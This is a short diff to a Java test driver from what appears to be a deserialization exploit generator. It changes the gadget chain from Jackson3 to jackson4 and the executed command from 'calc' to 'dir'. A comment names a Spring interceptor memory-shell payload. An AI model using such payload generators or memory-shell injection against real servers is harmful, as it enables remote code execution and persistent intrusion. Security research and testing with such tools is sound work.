@@ -8,9 +8,9 @@ import java.util.Base64;
 
 public class Test {
     public static void main(String[] args) throws Exception {
-        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("Jackson3");
+        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("jackson4");
         ObjectPayload                        payload      = payloadClass.newInstance();
-        Object                               object       = payload.getObject("calc");
+        Object                               object       = payload.getObject("dir"); //EX-MS-SpringInterceptorMS-gz
 
         secCig rootObj = new secCig();
         rootObj.setMessage("qi4l");
